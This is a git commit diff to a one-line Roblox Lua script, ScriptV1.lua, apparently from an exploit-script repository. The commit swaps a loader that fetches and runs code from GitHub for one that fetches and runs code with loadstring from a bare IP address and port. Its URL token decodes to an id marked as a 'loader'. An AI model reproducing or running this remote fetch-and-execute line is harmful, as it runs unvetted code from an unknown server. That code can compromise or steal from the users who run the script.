255b13cbdd4a1a9d4aa7f0a036abd029c3fcfac0
RobloxScripts <faceapp1125@gmail.com>
2026-02-06 00:52:26 +0300

    Update ScriptV1.lua

--- ScriptV1.lua
+++ ScriptV1.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/RobloxScriptBY/1/refs/heads/main/t"))()
+loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6IjMwYjM3NzczLTI1YzUtNDE5MS1hOTJmLTVmY2NlMGFhMDRhNSIsImtpbmQiOiJsb2FkZXIifQ"))()
